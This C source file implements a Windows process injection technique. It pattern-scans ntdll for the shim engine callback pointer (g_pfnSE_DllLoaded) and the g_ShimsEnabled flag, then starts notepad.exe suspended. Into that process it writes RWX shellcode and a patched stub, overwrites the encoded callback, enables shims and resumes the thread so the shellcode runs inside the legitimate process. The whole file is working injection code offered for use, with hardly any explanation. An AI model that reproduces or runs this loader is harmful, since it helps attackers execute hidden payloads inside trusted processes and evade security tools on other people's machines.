#include <windows.h>
#include <stdio.h>
#include "header.h"

// reference from assembly
void stub();

DWORD64 search_pattern(DWORD64 search_start_addr, DWORD search_size, byte* pattern, int pattern_len){
    printf("starting search for pattern @ 0x%llx: ", search_start_addr);
    for (int i = 0; i < pattern_len; i++){
        printf("%02x ", pattern[i]);
    }
    printf("\n");

    while (search_size > pattern_len){
        // search for first byte match
        DWORD64 result = (DWORD64)memchr((void*)search_start_addr, pattern[0], search_size);
        // if match, check 2nd byte (to reduce nunmber of memcmps)
        if (result){
            if (((byte*)result)[1] == pattern[1]){
                // 2 bytes match, now do full memcmp against pattern
                int memcmp_res = memcmp((void*)result, pattern, pattern_len);
                
                if (memcmp_res == 0){
                    // found it - parse the DWORD
                    printf("found match @ 0x%llx\n", result);
                    return result;
                    
                }
            }
            // no match, decrease search size and move search_start_addr forward
            DWORD offset = (DWORD)result - search_start_addr; 
            search_start_addr += offset + 1;
            search_size -= offset + 1;
        } else {
            // theres no more matches, just quit
            printf("couldn't find pattern\n");
            return 0;
        }
        
    } 
    return 0;
}


int main(){
    
    // get ntdll base address
    HMODULE ntdll = GetModuleHandleA("ntdll");
    printf("ntdll is at 0x%llx\n", ntdll);

    
    // parse ntdll for operional_headers (for .text addr & sizeofcode)
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)ntdll;
    IMAGE_FILE_HEADER* file_header = (IMAGE_FILE_HEADER*)((char*)dos_header + dos_header->e_lfanew + 0x4);
    IMAGE_OPTIONAL_HEADER64* optional_headers = (IMAGE_OPTIONAL_HEADER64*)((char*)file_header + sizeof(IMAGE_FILE_HEADER));
    
    
    // look for g_pfnSE_DllLoaded ptr
    // ntdll!LdrpLoadShimEngine+0xae:
    // 00007fff`bd47c9a8 8b14253003fe7f  mov     edx,dword ptr [SharedUserData+0x330 (00000000`7ffe0330)]
    // 00007fff`bd47c9af 8bc2            mov     eax,edx
    // 00007fff`bd47c9b1 488b3db0481100  mov     rdi,qword ptr [ntdll!g_pfnSE_DllLoaded (00007fff`bd591268)]
    byte pattern[] = {0x8b, 0x14, 0x25, 0x30, 0x03, 0xfe, 0x7f, 0x8b, 0xc2, 0x48, 0x8b, 0x3d};
    DWORD64 matched_addr = search_pattern((DWORD64)ntdll + optional_headers->BaseOfCode, optional_headers->SizeOfCode, pattern, sizeof(pattern));
    if (matched_addr == 0){
        printf("could not find match. exiting \n");
        return 0;
    }
    DWORD offset_to_ptr = *(DWORD*)(matched_addr + sizeof(pattern));
    DWORD64 ptr_to_callback = (matched_addr + sizeof(pattern) + sizeof(DWORD)) + offset_to_ptr;
    printf("ptr to g_pfnSE_DllLoaded: 0x%llx\n", ptr_to_callback);


    // look for g_ShimsEnabled ptr
    //ntdll!LdrpAppCompatRedirect+0x12:
    //00007fff`bd470dea 4157            push    r15
    //00007fff`bd470dec 4883ec50        sub     rsp,50h
    //00007fff`bd470df0 4533ff          xor     r15d,r15d
    //00007fff`bd470df3 498bf1          mov     rsi,r9
    //00007fff`bd470df6 44383d97c31000  cmp     byte ptr [ntdll!g_ShimsEnabled (00007fff`bd57d194)],r15b      
    byte pattern2[] = {0x57 ,0x48 ,0x83 ,0xec ,0x50 ,0x45 ,0x33 ,0xff ,0x49 ,0x8b ,0xf1 ,0x44 ,0x38 ,0x3d};
    matched_addr = search_pattern((DWORD64)ntdll + optional_headers->BaseOfCode, optional_headers->SizeOfCode, pattern2, sizeof(pattern2));
    if (matched_addr == 0){
        printf("could not find match. exiting \n");
        return 0;
    }
    offset_to_ptr = *(DWORD*)(matched_addr + sizeof(pattern2));
    DWORD64 ptr_to_switch = (matched_addr + sizeof(pattern2) + sizeof(DWORD)) + offset_to_ptr;
    printf("ptr to g_ShimsEnabled: 0x%llx\n", ptr_to_switch);


    // create suspended process
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    CreateProcessW(L"c:/Windows/system32/notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    printf("suspended process (pid %ld) created\n", pi.dwProcessId);

    // resolve NtQueueApcThread
    DWORD64 ntdll_pNtQueueApcThread = (DWORD64)GetProcAddress(ntdll, "NtQueueApcThread");
    
    // allocate memory in remote process
    DWORD max_stub_size = 0x30;
    void* shellcode_buf = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    void* stub_buf = VirtualAllocEx(pi.hProcess, NULL, max_stub_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Memory allocated in remote process : stub (0x%p) shellcode(0x%p)\n", stub_buf, shellcode_buf);
    
    // patch assembly stub to replace ptr to g_ShimsEnabled
    byte pattern3[] = {0x11, 0x11, 0x11, 0x11, 0x11, 0x11};
    matched_addr = search_pattern((DWORD64)stub, max_stub_size, pattern3, sizeof(pattern3));
    if (matched_addr == 0){
        printf("could not find match. exiting \n");
        return 0;
    }
    memcpy((void*)matched_addr, &ptr_to_switch, sizeof(ptr_to_switch));

    // patch assembly stub to replace ptr to shellcode in remote process
    byte pattern4[] = {0x22, 0x22, 0x22, 0x22, 0x22, 0x22};
    matched_addr = search_pattern((DWORD64)stub, max_stub_size, pattern4, sizeof(pattern4));
    if (matched_addr == 0){
        printf("could not find match. exiting \n");
        return 0;
    }
    memcpy((void*)matched_addr, &shellcode_buf, sizeof(&shellcode_buf));

    // patch assembly stub to replace NtQueueApcThread address
    byte pattern5[] = {0x33, 0x33, 0x33, 0x33, 0x33, 0x33};
    matched_addr = search_pattern((DWORD64)stub, max_stub_size, pattern5, sizeof(pattern5));
    if (matched_addr == 0){
        printf("could not find match. exiting \n");
        return 0;
    }
    memcpy((void*)matched_addr, &ntdll_pNtQueueApcThread, sizeof(&ntdll_pNtQueueApcThread));

    printf("assembly stub patched\n");
    
    // write stub + shellcode to remote process
    SIZE_T out = 0;
    WriteProcessMemory(pi.hProcess, shellcode_buf, shellcode, sizeof(shellcode), &out);
    WriteProcessMemory(pi.hProcess, stub_buf, stub, (SIZE_T)max_stub_size, &out);
    printf("stub & shellcode written to remote process\n");

    // callback addr is a system pointer that needs to be encoded
    // Credits to https://github.com/DarthTon/Blackbone/blob/780a5b09054b7017f01d75efa6e8ab20cb9c5ba9/src/BlackBone/ManualMap/Native/NtLoader.cpp#L291
    DWORD cookie = *(DWORD*)0x7FFE0330;
    DWORD64 encoded_callback_addr = _rotr64( cookie ^ (DWORD64)stub_buf, cookie & 0x3F );
    printf("encoded callbackptr 0x%p -> 0x%p\n", stub_buf, encoded_callback_addr);
    
    // overwrite callback ptr at g_pfnSE_DllLoaded in remote process
    WriteProcessMemory(pi.hProcess, (void*)ptr_to_callback, &encoded_callback_addr, sizeof(&encoded_callback_addr), &out);
    printf("wrote encoded callbackptr into g_pfnSE_DllLoaded at remote process\n");

    // enable switch
    char enable = 1;
    WriteProcessMemory(pi.hProcess, (void*)ptr_to_switch, &enable, sizeof(enable), &out);
    printf("switch enabled\n");

    // resume process
    ResumeThread(pi.hThread);
    printf("thread resumed\n");

}